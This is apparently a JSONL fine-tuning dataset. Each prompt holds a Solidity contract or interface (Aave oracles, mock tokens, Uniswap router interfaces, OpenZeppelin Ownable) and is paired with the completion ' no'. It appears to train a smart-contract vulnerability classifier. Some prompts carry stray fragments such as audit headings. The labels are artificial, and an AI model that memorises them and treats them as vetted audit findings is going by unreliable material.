\n \n function swapTokensForExactTokens( \n uint256 amountOut, \n uint256 amountInMax, \n address[] calldata path, \n address to, \n uint256 deadline \n ) external returns (uint256[] memory amounts); \n \n function swapExactETHForTokens( \n uint256 amountOutMin, \n address[] calldata path, \n address to, \n uint256 deadline \n ) external payable returns (uint256[] memory amounts); \n \n function swapTokensForExactETH( \n uint256 amountOut, \n uint256 amountInMax, \n address[] calldata path, \n address to, \n uint256 deadline \n ) external returns (uint256[] memory amounts); \n \n function swapExactTokensForETH( \n uint256 amountIn, \n uint256 amountOutMin, \n address[] calldata path, \n address to, \n uint256 deadline \n ) external returns (uint256[] memory amounts); \n \n function swapETHForExactTokens( \n uint256 amountOut, \n address[] calldata path, \n address to, \n uint256 deadline \n ) external payable returns (uint256[] memory amounts); \n \n function quote( \n uint256 amountA, \n uint256 reserveA, \n uint256 reserveB \n ) external pure returns (uint256 amountB); \n \n function getAmountOut( \n uint256 amountIn, \n uint256 reserveIn, \n uint256 reserveOut \n ) external pure returns (uint256 amountOut); \n \n function getAmountIn( \n uint256 amountOut, \n uint256 reserveIn, \n uint256 reserveOut \n ) external pure returns (uint256 amountIn); \n \n function getAmountsOut(uint256 amountIn, address[] calldata path) \n external \n view \n returns (uint256[] memory amounts); \n \n function getAmountsIn(uint256 amountOut, address[] calldata path) \n external \n view \n returns (uint256[] memory amounts); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface IWETH { \n function deposit() external payable; \n \n function withdraw(uint256) external; \n \n function approve(address guy, uint256 wad) external returns (bool); \n \n function transferFrom( \n address src, \n address dst, \n uint256 wad \n ) external returns (bool); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \npragma experimental ABIEncoderV2; \n \nimport {ILendingPoolAddressesProvider} from '../../interfaces/ILendingPoolAddressesProvider.sol'; \n \ninterface IUiPoolDataProvider { \n struct AggregatedReserveData { \n address underlyingAsset; \n string name; \n string symbol; \n uint256 decimals; \n uint256 baseLTVasCollateral; \n uint256 reserveLiquidationThreshold; \n uint256 reserveLiquidationBonus; \n uint256 reserveFactor; \n bool usageAsCollateralEnabled; \n bool borrowingEnabled; \n bool stableBorrowRateEnabled; \n bool isActive; \n bool isFrozen; \n // base data \n uint128 liquidityIndex; \n uint128 variableBorrowIndex; \n uint128 liquidityRate; \n uint128 variableBorrowRate; \n uint128 stableBorrowRate; \n uint40 lastUpdateTimestamp; \n address aTokenAddress; \n address stableDebtTokenAddress; \n address variableDebtTokenAddress; \n address interestRateStrategyAddress; \n // \n uint256 availableLiquidity; \n uint256 totalPrincipalStableDebt; \n uint256 averageStableRate; \n uint256 stableDebtLastUpdateTimestamp; \n uint256 totalScaledVariableDebt; \n uint256 priceInEth; \n uint256 variableRateSlope1; \n uint256 variableRateSlope2; \n uint256 stableRateSlope1; \n uint256 stableRateSlope2; \n } \n // \n // struct ReserveData { \n // uint256 averageStableBorrowRate; \n // uint256 totalLiquidity; \n // } \n \n struct UserReserveData { \n address underlyingAsset; \n uint256 scaledATokenBalance; \n bool usageAsCollateralEnabledOnUser; \n uint256 stableBorrowRate; \n uint256 scaledVariableDebt; \n uint256 principalStableDebt; \n uint256 stableBorrowLastUpdateTimestamp; \n } \n \n // \n // struct ATokenSupplyData { \n // string name; \n // string symbol; \n // uint8 decimals; \n // uint256 totalSupply; \n // address aTokenAddress; \n // } \n \n function getReservesData(ILendingPoolAddressesProvider provider, address user) \n external \n view \n returns ( \n AggregatedReserveData[] memory, \n UserReserveData[] memory, \n uint256 \n ); \n \n // function getUserReservesData(ILendingPoolAddressesProvider provider, address user) \n // external \n // view \n // returns (UserReserveData[] memory); \n // \n // function getAllATokenSupply(ILendingPoolAddressesProvider provider) \n // external \n // view \n // returns (ATokenSupplyData[] memory); \n // \n // function getATokenSupply(address[] calldata aTokens) \n // external \n // view \n // returns (ATokenSupplyData[] memory); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface IWETHGateway { \n function depositETH( \n address lendingPool, \n address onBehalfOf, \n uint16 referralCode \n ) external payable; \n \n function withdrawETH( \n address lendingPool, \n uint256 amount, \n address onBehalfOf \n ) external; \n \n function repayETH( \n address lendingPool, \n uint256 amount, \n uint256 rateMode, \n address onBehalfOf \n ) external payable; \n \n function borrowETH( \n address lendingPool, \n uint256 amount, \n uint256 interesRateMode, \n uint16 referralCode \n ) external; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {Ownable} from '../dependencies/openzeppelin/contracts/Ownable.sol'; \nimport {IERC20} from '../dependencies/openzeppelin/contracts/IERC20.sol'; \n \nimport {IPriceOracleGetter} from '../interfaces/IPriceOracleGetter.sol'; \nimport {IChainlinkAggregator} from '../interfaces/IChainlinkAggregator.sol'; \nimport {SafeERC20} from '../dependencies/openzeppelin/contracts/SafeERC20.sol'; \n \n/// @title AaveOracle \n/// @author Aave \n/// @notice Proxy smart contract to get the price of an asset from a price source, with Chainlink Agg\n/// smart contracts as primary option \n/// - If the returned price by a Chainlink aggregator is <= 0, the call is forwarded to a fallbackOra\n/// - Owned by the Aave governance system, allowed to add sources for assets, replace them \n/// and change the fallbackOracle \ncontract AaveOracle is IPriceOracleGetter, Ownable { \n using SafeERC20 for IERC20; \n \n event AssetSourceUpdated(address indexed asset, address indexed source); \n event FallbackOracleUpdated(address indexed fallbackOracle); \n \n mapping(address => IChainlinkAggregator) private assetsSources; \n IPriceOracleGetter private _fallbackOracle; \n \n /// @notice Constructor \n /// @param assets The addresses of the assets \n /// @param sources The address of the source of each asset \n /// @param fallbackOracle The address of the fallback oracle to use if the data of an \n /// aggregator is not consistent \n constructor( \n address[] memory assets, \n address[] memory sources, \n address fallbackOracle \n ) public { \n _setFallbackOracle(fallbackOracle); \n _setAssetsSources(assets, sources); \n } \n \n /// @notice External function called by the Aave governance to set or replace sources of assets \n /// @param assets The addresses of the assets \n /// @param sources The address of the source of each asset \n function setAssetSources(address[] calldata assets, address[] calldata sources) \n external \n onlyOwner \n { \n _setAssetsSources(assets, sources); \n } \n \n /// @notice Sets the fallbackOracle \n /// - Callable only by the Aave governance \n /// @param fallbackOracle The address of the fallbackOracle \n function setFallbackOracle(address fallbackOracle) external onlyOwner { \n _setFallbackOracle(fallbackOracle); \n } \n \n /// @notice Internal function to set the sources for each asset \n /// @param assets The addresses of the assets \n /// @param sources The address of the source of each asset \n function _setAssetsSources(address[] memory assets, address[] memory sources) internal { \n require(assets.length == sources.length, 'INCONSISTENT_PARAMS_LENGTH'); \n for (uint256 i = 0; i < assets.length; i++) { \n assetsSources[assets[i]] = IChainlinkAggregator(sources[i]); \n emit AssetSourceUpdated(assets[i], sources[i]); \n } \n } \n \n /// @notice Internal function to set the fallbackOracle \n /// @param fallbackOracle The address of the fallbackOracle \n function _setFallbackOracle(address fallbackOracle) internal { \n _fallbackOracle = IPriceOracleGetter(fallbackOracle); \n emit FallbackOracleUpdated(fallbackOracle); \n } \n \n /// @notice Gets an asset price by address \n /// @param asset The asset address \n function getAssetPrice(address asset) public view override returns (uint256) { \n IChainlinkAggregator source = assetsSources[asset]; \n \n if (address(source) == address(0)) { \n return _fallbackOracle.getAssetPrice(asset); \n } else { \n int256 price = IChainlinkAggregator(source).latestAnswer(); \n if (price > 0) { \n return uint256(price); \n } else { \n return _fallbackOracle.getAssetPrice(asset); \n } \n } \n } \n \n /// @notice Gets a list of prices from a list of assets addresses \n /// @param assets The list of assets addresses \n function getAssetsPrices(address[] calldata assets) external view returns (uint256[] memory) { \n uint256[] memory prices = new uint256[](assets.length); \n for (uint256 i = 0; i < assets.length; i++) { \n prices[i] = getAssetPrice(assets[i]); \n } \n return prices; \n } \n \n /// @notice Gets the address of the source for an asset address \n /// @param asset The address of the asset \n /// @return address The address of the source \n function getSourceOfAsset(address asset) external view returns (address) { \n return address(assetsSources[asset]); \n } \n \n /// @notice Gets the address of the fallback oracle \n /// @return address The addres of the fallback oracle \n function getFallbackOracle() external view returns (address) { \n return address(_fallbackOracle); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \npragma experimental ABIEncoderV2; \n \nimport {Address} from '../dependencies/openzeppelin/contracts/Address.sol'; \nimport {IERC20} from '../dependencies/openzeppelin/contracts/IERC20.sol'; \n \nimport {ILendingPoolAddressesProvider} from '../interfaces/ILendingPoolAddressesProvider.sol'; \nimport {ILendingPool} from '../interfaces/ILendingPool.sol'; \nimport {SafeERC20} from '../dependencies/openzeppelin/contracts/SafeERC20.sol'; \nimport {ReserveConfiguration} from '../protocol/libraries/configuration/ReserveConfiguration.sol'; \nimport {DataTypes} from '../protocol/libraries/types/DataTypes.sol'; \n \n/** \n * @title WalletBalanceProvider contract \n * @author Aave, influenced by https://github.com/wbobeirne/eth-balance-checker/blob/master/contracts\n * @notice Implements a logic of getting multiple tokens balance for one user address \n * @dev NOTE: THIS CONTRACT IS NOT USED WITHIN THE AAVE PROTOCOL. It's an accessory contract used to \n * towards the blockchain from the Aave backend. \n **/ \ncontract WalletBalanceProvider { \n using Address for address payable; \n using Address for address; \n using SafeERC20 for IERC20; \n using ReserveConfiguration for DataTypes.ReserveConfigurationMap; \n \n address constant MOCK_ETH_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE; \n \n /** \n @dev Fallback function, don't accept any ETH \n **/ \n receive() external payable { \n //only contracts can send ETH to the core \n require(msg.sender.isContract(), '22'); \n } \n \n /** \n @dev Check the token balance of a wallet in a token contract \n \n Returns the balance of the token for user. Avoids possible errors: \n - return 0 on non-contract address \n **/ \n function balanceOf(address user, address token) public view returns (uint256) { \n if (token == MOCK_ETH_ADDRESS) { \n return user.balance; // ETH balance \n // check if token is actually a contract \n } else if (token.isContract()) { \n return IERC20(token).balanceOf(user); \n } \n revert('INVALID_TOKEN'); \n } \n \n /** \n * @notice Fetches, for a list of _users and _tokens (ETH included with mock address), the balances\n * @param users The list of users \n * @param tokens The list of tokens \n * @return And array with the concatenation of, for each user, his/her balances \n **/ \n function batchBalanceOf(address[] calldata users, address[] calldata tokens) \n external \n view \n returns (uint256[] memory) \n { \n uint256[] memory balances = new uint256[](users.length * tokens.length); \n \n for (uint256 i = 0; i < users.length; i++) { \n for (uint256 j = 0; j < tokens.length; j++) { \n balances[i * tokens.length + j] = balanceOf(users[i], tokens[j]); \n } \n } \n \n return balances; \n } \n \n /** \n @dev provides balances of user wallet for all reserves available on the pool \n */ \n function getUserWalletBalances(address provider, address user) \n external \n view \n returns (address[] memory, uint256[] memory) \n { \n ILendingPool pool = ILendingPool(ILendingPoolAddressesProvider(provider).getLendingPool()); \n \n address[] memory reserves = pool.getReservesList(); \n address[] memory reservesWithEth = new address[](reserves.length + 1); \n for (uint256 i = 0; i < reserves.length; i++) { \n reservesWithEth[i] = reserves[i]; \n } \n reservesWithEth[reserves.length] = MOCK_ETH_ADDRESS; \n \n uint256[] memory balances = new uint256[](reservesWithEth.length); \n \n for (uint256 j = 0; j < reserves.length; j++) { \n DataTypes.ReserveConfigurationMap memory configuration = \n pool.getConfiguration(reservesWithEth[j]); \n \n (bool isActive, , , ) = configuration.getFlagsMemory(); \n \n if (!isActive) { \n balances[j] = 0; \n continue; \n } \n balances[j] = balanceOf(user, reservesWithEth[j]); \n } \n balances[reserves.length] = balanceOf(user, MOCK_ETH_ADDRESS); \n \n return (reservesWithEth, balances); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {VariableDebtToken} from '../../protocol/tokenization/VariableDebtToken.sol'; \n \ncontract MockVariableDebtToken is VariableDebtToken { \n function getRevision() internal pure override returns (uint256) { \n return 0x2; \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {StableDebtToken} from '../../protocol/tokenization/StableDebtToken.sol'; \n \ncontract MockStableDebtToken is StableDebtToken { \n function getRevision() internal pure override returns (uint256) { \n return 0x2; \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {AToken} from '../../protocol/tokenization/AToken.sol'; \nimport {ILendingPool} from '../../interfaces/ILendingPool.sol'; \nimport {IAaveIncentivesController} from '../../interfaces/IAaveIncentivesController.sol'; \n \ncontract MockAToken is AToken { \n function getRevision() internal pure override returns (uint256) { \n return 0x2; \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ncontract SelfdestructTransfer { \n function destroyAndTransfer(address payable to) external payable { \n selfdestruct(to); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {ERC20} from '../../dependencies/openzeppelin/contracts/ERC20.sol'; \n \n/** \n * @title ERC20Mintable \n * @dev ERC20 minting logic \n */ \ncontract MintableDelegationERC20 is ERC20 { \n address public delegatee; \n \n constructor( \n string memory name, \n string memory symbol, \n uint8 decimals \n ) public ERC20(name, symbol) { \n _setupDecimals(decimals); \n } \n \n /** \n * @dev Function to mint tokensp \n * @param value The amount of tokens to mint. \n * @return A boolean that indicates if the operation was successful. \n */ \n function mint(uint256 value) public returns (bool) { \n _mint(msg.sender, value); \n return true; \n } \n \n function delegate(address delegateeAddress) external { \n delegatee = delegateeAddress; \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.4.22 <=0.6.12; \n \nimport {WETH9} from '../dependencies/weth/WETH9.sol'; \n \ncontract WETH9Mocked is WETH9 { \n // Mint not backed by Ether: only for testing purposes \n function mint(uint256 value) public returns (bool) { \n balanceOf[msg.sender] += value; \n emit Transfer(address(0), msg.sender, value); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {ERC20} from '../../dependencies/openzeppelin/contracts/ERC20.sol'; \n \n/** \n * @title ERC20Mintable \n * @dev ERC20 minting logic \n */ \ncontract MintableERC20 is ERC20 { \n constructor( \n string memory name, \n string memory symbol, \n uint8 decimals \n ) public ERC20(name, symbol) { \n _setupDecimals(decimals); \n } \n \n /** \n * @dev Function to mint tokens \n * @param value The amount of tokens to mint. \n * @return A boolean that indicates if the operation was successful. \n */ \n function mint(uint256 value) public returns (bool) { \n _mint(_msgSender(), value); \n return true; \n } \n} \n// Copyright (C) 2015, 2016, 2017 Dapphub \n \n// This program is free software: you can redistribute it and/or modify \n// it under the terms of the GNU General Public License as published by \n// the Free Software Foundation, either version 3 of the License, or \n// (at your option) any later version. \n \n// This program is distributed in the hope that it will be useful, \n// but WITHOUT ANY WARRANTY; without even the implied warranty of \n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the \n// GNU General Public License for more details. \n \n// You should have received a copy of the GNU General Public License \n// along with this program. If not, see <http://www.gnu.org/licenses/>. \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {SafeMath} from '../../dependencies/openzeppelin/contracts/SafeMath.sol'; \nimport {IERC20} from '../../dependencies/openzeppelin/contracts/IERC20.sol'; \n \nimport {FlashLoanReceiverBase} from '../../flashloan/base/FlashLoanReceiverBase.sol'; \nimport {MintableERC20} from '../tokens/MintableERC20.sol'; \nimport {SafeERC20} from '../../dependencies/openzeppelin/contracts/SafeERC20.sol'; \nimport {ILendingPoolAddressesProvider} from '../../interfaces/ILendingPoolAddressesProvider.sol'; \n \ncontract MockFlashLoanReceiver is FlashLoanReceiverBase { \n using SafeERC20 for IERC20; \n \n ILendingPoolAddressesProvider internal _provider; \n \n event ExecutedWithFail(address[] _assets, uint256[] _amounts, uint256[] _premiums); \n event ExecutedWithSuccess(address[] _assets, uint256[] _amounts, uint256[] _premiums); \n \n bool _failExecution; \n uint256 _amountToApprove; \n bool _simulateEOA; \n \n constructor(ILendingPoolAddressesProvider provider) public FlashLoanReceiverBase(provider) {} \n \n function setFailExecutionTransfer(bool fail) public { \n _failExecution = fail; \n } \n \n function setAmountToApprove(uint256 amountToApprove) public { \n _amountToApprove = amountToApprove; \n } \n \n function setSimulateEOA(bool flag) public { \n _simulateEOA = flag; \n } \n \n function amountToApprove() public view returns (uint256) { \n return _amountToApprove; \n } \n \n function simulateEOA() public view returns (bool) { \n return _simulateEOA; \n } \n \n function executeOperation( \n address[] memory assets, \n uint256[] memory amounts, \n uint256[] memory premiums, \n address initiator, \n bytes memory params \n ) public override returns (bool) { \n params; \n initiator; \n \n if (_failExecution) { \n emit ExecutedWithFail(assets, amounts, premiums); \n return !_simulateEOA; \n } \n \n for (uint256 i = 0; i < assets.length; i++) { \n //mint to this contract the specific amount \n MintableERC20 token = MintableERC20(assets[i]); \n \n //check the contract has the specified balance \n require( \n amounts[i] <= IERC20(assets[i]).balanceOf(address(this)), \n 'Invalid balance for the contract' \n ); \n \n uint256 amountToReturn = \n (_amountToApprove != 0) ? _amountToApprove : amounts[i].add(premiums[i]); \n //execution does not fail - mint tokens and return them to the _destination \n \n token.mint(premiums[i]); \n \n IERC20(assets[i]).approve(address(LENDING_POOL), amountToReturn); \n } \n \n emit ExecutedWithSuccess(assets, amounts, premiums); \n \n return true; \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {IUniswapV2Router02} from '../../interfaces/IUniswapV2Router02.sol'; \nimport {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol'; \nimport {MintableERC20} from '../tokens/MintableERC20.sol'; \n \ncontract MockUniswapV2Router02 is IUniswapV2Router02 { \n mapping(address => uint256) internal _amountToReturn; \n mapping(address => uint256) internal _amountToSwap; \n mapping(address => mapping(address => mapping(uint256 => uint256))) internal _amountsIn; \n mapping(address => mapping(address => mapping(uint256 => uint256))) internal _amountsOut; \n uint256 internal defaultMockValue; \n \n function setAmountToReturn(address reserve, uint256 amount) public { \n _amountToReturn[reserve] = amount; \n } \n \n function setAmountToSwap(address reserve, uint256 amount) public { \n _amountToSwap[reserve] = amount; \n } \n \n function swapExactTokensForTokens( \n uint256 amountIn, \n uint256, /* amountOutMin */ \n address[] calldata path, \n address to, \n uint256 /* deadline */ \n ) external override returns (uint256[] memory amounts) { \n IERC20(path[0]).transferFrom(msg.sender, address(this), amountIn); \n \n MintableERC20(path[1]).mint(_amountToReturn[path[0]]); \n IERC20(path[1]).transfer(to, _amountToReturn[path[0]]); \n \n amounts = new uint256[](path.length); \n amounts[0] = amountIn; \n amounts[1] = _amountToReturn[path[0]]; \n } \n \n function swapTokensForExactTokens( \n uint256 amountOut, \n uint256, /* amountInMax */ \n address[] calldata path, \n address to, \n uint256 /* deadline */ \n ) external override returns (uint256[] memory amounts) { \n IERC20(path[0]).transferFrom(msg.sender, address(this), _amountToSwap[path[0]]); \n \n MintableERC20(path[1]).mint(amountOut); \n IERC20(path[1]).transfer(to, amountOut); \n \n amounts = new uint256[](path.length); \n amounts[0] = _amountToSwap[path[0]]; \n amounts[1] = amountOut; \n } \n \n function setAmountOut( \n uint256 amountIn, \n address reserveIn, \n address reserveOut, \n uint256 amountOut \n ) public { \n _amountsOut[reserveIn][reserveOut][amountIn] = amountOut; \n } \n \n function setAmountIn( \n uint256 amountOut, \n address reserveIn, \n address reserveOut, \n uint256 amountIn \n ) public { \n _amountsIn[reserveIn][reserveOut][amountOut] = amountIn; \n } \n \n function setDefaultMockValue(uint256 value) public { \n defaultMockValue = value; \n } \n \n function getAmountsOut(uint256 amountIn, address[] calldata path) \n external \n view \n override \n returns (uint256[] memory) \n { \n uint256[] memory amounts = new uint256[](path.length); \n amounts[0] = amountIn; \n amounts[1] = _amountsOut[path[0]][path[1]][amountIn] > 0 \n ? _amountsOut[path[0]][path[1]][amountIn] \n : defaultMockValue; \n return amounts; \n } \n \n function getAmountsIn(uint256 amountOut, address[] calldata path) \n external \n view \n override \n returns (uint256[] memory) \n { \n uint256[] memory amounts = new uint256[](path.length); \n amounts[0] = _amountsIn[path[0]][path[1]][amountOut] > 0 \n ? _amountsIn[path[0]][path[1]][amountOut] \n : defaultMockValue; \n amounts[1] = amountOut; \n return amounts; \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ncontract MockAggregator { \n int256 private _latestAnswer; \n \n event AnswerUpdated(int256 indexed current, uint256 indexed roundId, uint256 timestamp); \n \n constructor(int256 _initialAnswer) public { \n _latestAnswer = _initialAnswer; \n emit AnswerUpdated(_initialAnswer, 0, now); \n } \n \n function latestAnswer() external view returns (int256) { \n return _latestAnswer; \n } \n \n function getTokenType() external view returns (uint256) { \n return 1; \n } \n \n // function getSubTokens() external view returns (address[] memory) { \n // TODO: implement mock for when multiple subtokens. Maybe we need to create diff mock contract \n // to call it from the migration for this case?? \n // } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {IPriceOracle} from '../../interfaces/IPriceOracle.sol'; \n \ncontract PriceOracle is IPriceOracle { \n mapping(address => uint256) prices; \n uint256 ethPriceUsd; \n \n event AssetPriceUpdated(address _asset, uint256 _price, uint256 timestamp); \n event EthPriceUpdated(uint256 _price, uint256 timestamp); \n \n function getAssetPrice(address _asset) external view override returns (uint256) { \n return prices[_asset]; \n } \n \n function setAssetPrice(address _asset, uint256 _price) external override { \n prices[_asset] = _price; \n emit AssetPriceUpdated(_asset, _price, block.timestamp); \n } \n \n function getEthUsdPrice() external view returns (uint256) { \n return ethPriceUsd; \n } \n \n function setEthUsdPrice(uint256 _price) external { \n ethPriceUsd = _price; \n emit EthPriceUpdated(_price, block.timestamp); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface ChainlinkUSDETHOracleI { \n event AnswerUpdated(int256 indexed current, uint256 indexed answerId); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface IExtendedPriceAggregator { \n event AnswerUpdated(int256 indexed current, uint256 indexed roundId, uint256 timestamp); \n \n function getToken() external view returns (address); \n \n function getTokenType() external view returns (uint256); \n \n function getPlatformId() external view returns (uint256); \n \n function getSubTokens() external view returns (address[] memory); \n \n function latestAnswer() external view returns (int256); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {ILendingRateOracle} from '../../interfaces/ILendingRateOracle.sol'; \nimport {Ownable} from '../../dependencies/openzeppelin/contracts/Ownable.sol'; \n \ncontract LendingRateOracle is ILendingRateOracle, Ownable { \n mapping(address => uint256) borrowRates; \n mapping(address => uint256) liquidityRates; \n function getMarketBorrowRate(address _asset) external view override returns (uint256) {\n return borrowRates[_asset];\n }\n function setMarketBorrowRate(address _asset, uint256 _rate) external override onlyOwner {\n borrowRates[_asset] = _rate;\n }\n function getMarketLiquidityRate(address _asset) external view returns (uint256) {\n return liquidityRates[_asset];\n }\n function setMarketLiquidityRate(address _asset, uint256 _rate) external onlyOwner {\n liquidityRates[_asset] = _rate;\n }\n}\n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12;\n interface GenericOracleI {\n // ganache\n event AssetPriceUpdated(address _asset, uint256 _price, uint256 timestamp);\n event EthPriceUpdated(uint256 _price, uint256 timestamp);\n // kovan\n event ProphecySubmitted(\n address indexed _sybil,\n address indexed _asset,\n uint96 _sybilProphecy,\n uint96 _oracleProphecy\n );\n function getAssetPrice(address _asset) external view returns (uint256);\n function getEthUsdPrice() external view returns (uint256);\n}\n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ninterface GenericOracleI { \n // ganache \n event AssetPriceUpdated(address _asset, uint256 _price, uint256 timestamp); \n event EthPriceUpdated(uint256 _price, uint256 timestamp); \n \n // kovan \n event ProphecySubmitted( \n address indexed _sybil, \n address indexed _asset, \n uint96 _sybilProphecy, \n uint96 _oracleProphecy \n ); \n \n function getAssetPrice(address _asset) external view returns (uint256); \n \n function getEthUsdPrice() external view returns (uint256); \n} \n \nAnalysis of audit results\nRe-Entrancy\nArithmetic Over/Under Flows\n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.8.0; \nimport \"@openzeppelin/contracts/finance/VestingWallet.sol\"; \n \ncontract VestingToken is VestingWallet{ \n constructor( \n address beneficiaryAddress, \n uint64 startTimestamp, \n uint64 durationSeconds \n ) VestingWallet(beneficiaryAddress, startTimestamp, durationSeconds){} \n \n receive() external payable override { \n revert(\"UNSUPPORTED_OP\"); \n } \n \n function release() public override { \n revert(\"UNSUPPORTED_OP\"); \n } \n} \nAnalysis of audit results\n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.8.0; \n \n/** \n * @dev Provides information about the current execution context, including the \n * sender of the transaction and its data. While these are generally available \n * via msg.sender and msg.data, they should not be accessed in such a direct \n * manner, since when dealing with meta-transactions the account sending and \n * paying for execution may not be the actual sender (as far as an application \n * is concerned). \n * \n * This contract is only required for intermediate, library-like contracts. \n */ \nabstract contract Context { \n function _msgSender() internal view virtual returns (address) { \n return msg.sender; \n } \n \n function _msgData() internal view virtual returns (bytes calldata) { \n return msg.data; \n } \n} \n \n \n// File @openzeppelin/contracts/access/Ownable.sol@v4.3.3 \n \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.8.0; \n \n/** \n * @dev Contract module which provides a basic access control mechanism, where \n * there is an account (an owner) that can be granted exclusive access to \n * specific functions. \n * \n * By default, the owner account will be the one that deploys the contract. This \n * can later be changed with {transferOwnership}. \n * \n * This module is used through inheritance. It will make available the modifier \n * `onlyOwner`, which can be applied to your functions to restrict their use to \n * the owner. \n */ \nabstract contract Ownable is Context { \n address private _owner; \n \n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); \n \n /** \n * @dev Initializes the contract setting the deployer as the initial owner. \n */ \n constructor() { \n _setOwner(_msgSender()); \n } \n \n /** \n * @dev Returns the address of the current owner. \n */ \n function owner() public view virtual returns (address) { \n return _owner; \n } \n \n /** \n * @dev Throws if called by any account other than the owner. \n */ \n modifier onlyOwner() { \n require(owner() == _msgSender(), \"Ownable: caller is not the owner\"); \n _; \n } \n \n /** \n * @dev Leaves the contract without owner. It will not be possible to call \n * `onlyOwner` functions anymore. Can only be called by the current owner. \n * \n * NOTE: Renouncing ownership will leave the contract without an owner, \n * thereby removing any functionality that is only available to the owner. \n */ \n function renounceOwnership() public virtual onlyOwner { \n _setOwner(address(0)); \n } \n \n /** \n * @dev Transfers ownership of the contract to a new account (`newOwner`). \n * Can only be called by the current owner. \n */ \n function transferOwnership(address newOwner) public virtual onlyOwner { \n require(newOwner != address(0), \"Ownable: new owner is the zero address\"); \n _setOwner(newOwner); \n } \n \n function _setOwner(address newOwner) private { \n address oldOwner = _owner; \n _owner = newOwner; \n emit OwnershipTransferred(oldOwner, newOwner); \n } \n} \n \n \n// File @openzeppelin/contracts/utils/math/SafeMath.sol@v4.3.3 \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.8.10; \n \ninterface IBEP20 { \n /** \n * @dev Returns the amount of tokens in existence. \n */ \n function totalSupply() external view returns (uint256); \n \n /** \n * @dev Returns the token decimals. \n */ \n function decimals() external view returns (uint8); \n \n /** \n * @dev Returns the token symbol. \n */ \n function symbol() external view returns (string memory); \n \n /** \n * @dev Returns the token name. \n */ \n function name() external view returns (string memory); \n \n /** \n * @dev Returns the bep token owner. \n */ \n function getOwner() external view returns (address); \n \n /** \n * @dev Returns the amount of tokens owned by `account`. \n */ \n function balanceOf(address account) external view returns (uint256); \n \n /** \n * @dev Moves `amount` tokens from the caller's account to `recipient`. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n /** \n * @dev Returns the remaining number of tokens that `spender` will be \n * allowed to spend on behalf of `owner` through {transferFrom}. This is \n * zero by default. \n * \n * This value changes when {approve} or {transferFrom} are called. \n */ \n function allowance(address _owner, address spender) external view returns (uint256); \n \n /** \n * @dev Sets `amount` as the allowance of `spender` over the caller's tokens. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * IMPORTANT: Beware that changing an allowance with this method brings the risk \n * that someone may use both the old and the new allowance by unfortunate \n * transaction ordering. One possible solution to mitigate this race \n * condition is to first reduce the spender's allowance to 0 and set the \n * desired value afterwards: \n * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 \n * \n * Emits an {Approval} event. \n */ \n function approve(address spender, uint256 amount) external returns (bool); \n \n /** \n * @dev Moves `amount` tokens from `sender` to `recipient` using the \n * allowance mechanism. `amount` is then deducted from the caller's \n * allowance. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n /** \n * @dev Emitted when `value` tokens are moved from one account (`from`) to \n * another (`to`). \n * \n * Note that `value` may be zero. \n */ \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n /** \n * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n * a call to {approve}. `value` is the new allowance. \n */ \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \n \n// File contracts/Token.sol \n \n\n\n###\n\n", "completion": " no###\n###"}
